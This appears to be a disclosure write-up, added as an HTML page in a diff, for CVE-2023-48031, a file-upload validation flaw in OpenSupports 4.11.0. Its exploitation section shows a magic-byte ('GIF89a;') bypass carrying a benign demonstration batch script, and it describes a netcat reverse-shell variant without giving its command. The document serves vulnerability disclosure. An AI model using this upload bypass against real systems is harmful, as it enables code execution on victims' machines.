@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>CVE-2023-48031</title>
+</head>
+<body>
+    <div class="green snipcss-3NIWg">
+        <div class="container center headings--one-size">
+          <header class="header">
+            <div class="header__inner">
+              <div class="header__logo">
+                <a href="#">
+                  <div class="logo">
+                    Quantiano
+                  </div>
+                </a>
+              </div>
+              <ul class="menu menu--mobile">
+                <li>
+                  <ul class="menu__dropdown">
+                    <li>
+                    </li>
+                    <li>
+                    </li>
+                  </ul>
+                </li>
+              </ul>
+            </div>
+            <nav class="navigation-menu">
+              <ul class="navigation-menu__inner menu--desktop">
+              </ul>
+            </nav>
+          </header>
+          <div class="content">
+            <article class="post">
+              <h1 class="post-title">
+                <a href="#">
+                  CVE-2023-48031
+                </a>
+              </h1>
+              <div class="post-meta">
+                <time class="post-date">
+                  2023-11-16
+                </time>
+                <span class="post-author">
+                  Nitipoom Jaroonchaipipat
+                </span>
+              </div><br>
+              <hr>
+              <div class="post-content">
+                <div>
+                  <h2 id="#">
+                    Product detail
+                    <a href="#" class="hanchor" arialabel="Anchor">
+                      ⌗
+                    </a>
+                  </h2>
+                  <ui>Affected product: OpenSupports</ui><br>
+                  <ui>Affected version: 4.11.0</ui><br>
+                  <ui>Affected component: ’api/ticket/comment’</ui><br><br>
+                  <p class="image-description">
+                    Improper File Type Validation vulnerability in the ’api/ticket/comment’ in OpenSupports version 4.11.0 allows an attacker to bypass security restrictions and upload a .bat file by manipulating the file's magic bytes to masquerade as an allowed type. This can enable the attacker to execute arbitrary code or establish a reverse shell, leading to unauthorized file writes or control over the victim's station via a crafted file upload operation.
+                  </p>
+                  <hr>
+                  <h2 id="proof-of-concept">
+                    Prerequisite
+                    <a href="#proof-of-concept" class="hanchor" arialabel="Anchor">
+                      ⌗
+                    </a>
+                  </h2>
+                  <p >
+                    Install OpenSupports from official OpenSupports Github repository  
+                    <a href="https://github.com/opensupports/opensupports" target="_blank">
+                      GitHub page
+                    </a><br>
+                  </p>
+                  <img src="00.png">
+                  <p class="image-description">OpenSupports version 4.11.0 released on Jan 11, 2022</p><br>
+                  <img src="0.gif">
+                  <p class="image-description">Installed OpenSupports version 4.11.0</p><br>
+             
+                  <hr>
+
+                  <h2 id="normal">
+                    Normal flow
+                    <a href="#normal" class="hanchor" arialabel="Anchor">
+                      ⌗
+                    </a>
+                  </h2>
+                  <img src="1.png">
+                  <p class="image-description">
+                      Click upload file and select acceptable file type which are below:
+                    </p>
+                    <img src="44.png"><br><br>
+
+                    <img src="4.gif">
+                    <p class="image-description">
+                      JPG file uploaded successfully
+                    </p>
+
+                    <img src="4.5.gif"><br>
+                    <img src="4.5.png">
+                    <p class="image-description">
+                      Now, upload restrict file type such as .bat file without an acceptable filetype magicbyte. The result is it cannot be uploaded because of invalid file type.
+                    </p>
+
+
+<hr>
+
+    
+                  <h2 id="proof-of-concept">
+                    Exploitation
+                    <a href="#proof-of-concept" class="hanchor" arialabel="Anchor">
+                      ⌗
+                    </a>
+                  </h2>
+
+                  <p class="image-description">
+                    1. Upload the restrict file with the magicbyte of acceptable filetype<br>
+                    <code>
+                      <xmp>
+                        GIF89a;
+                      </xmp>
+                    </code>
+<hr>
+
+                    <code>
+                      <xmp>
+                        GIF89a;
+                        @echo off
+                        REM -- Start of the benign payload demonstration batch script --
+
+                        echo This is a demonstration of a file upload vulnerability.
+                        echo Your system is not harmed.
+                        echo This script will now perform some visible, non-destructive actions to demonstrate the impact of this flaw.
+
+                        REM -- Create a non-harmful text file on the desktop --
+                        echo This could have been a harmful action! > "%userprofile%\Desktop\TEST_ENV\PWNED.txt"
+
+                        REM -- Open notepad and display the created text file --
+                        notepad "%userprofile%\Desktop\TEST_ENV\PWNED.txt"
+
+                        REM -- Display a message in the console --
+                        echo If this were a malicious payload, it could have executed harmful actions!
+
+                        REM -- Pause the batch file so the user can see the console messages --
+                        pause
+
+
+                        REM -- End of script --
+                    </xmp>
+                    </code>
+                  </p>
+
+ 
+                  <p class="image-description">
+                    The exploitation is shown below:
+                  </p>
+                  <img src="5.gif"><br><br><hr>
+
+                  <img src="6.gif">
+                  <p class="image-description">
+                    When victim downloads and executes a bat file, it could create and execute a malicious file on victim's workstation.
+                  </p><br><br>
+
+                  <img src="7.gif">
+                  <p class="image-description">
+                    Another example of the impact will be the reverse shell. So, upload a bat file and bypass with a magicbyte technique again, but this bat contains a reverse shell.
+                  </p><br><br>
+                  
+                  <img src="8.gif">
+                  <p class="image-description">
+                    Establish a connection back to attacker when execute. In this case, we use netcat for demonstration.
+                  </p>
+
+                
+                </div>
+              </div>
+            </article>
+          </div>
+          <footer class="footer">
+            <div class="footer__inner">
+              <div class="copyright">
+                <span>
+                  © 2023 Powered by 
+                  <a href="https://gohugo.io">
+                    Hugo
+                  </a>
+                </span>
+                <span>
+                  :: 
+                  <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">
+                    Theme
+                  </a>
+                  made by 
+                  <a href="https://github.com/panr" target="_blank">
+                    panr
+                  </a>
+                </span>
+              </div>
+            </div>
+          </footer>
+</body>
+</html>
+
+
+
+  
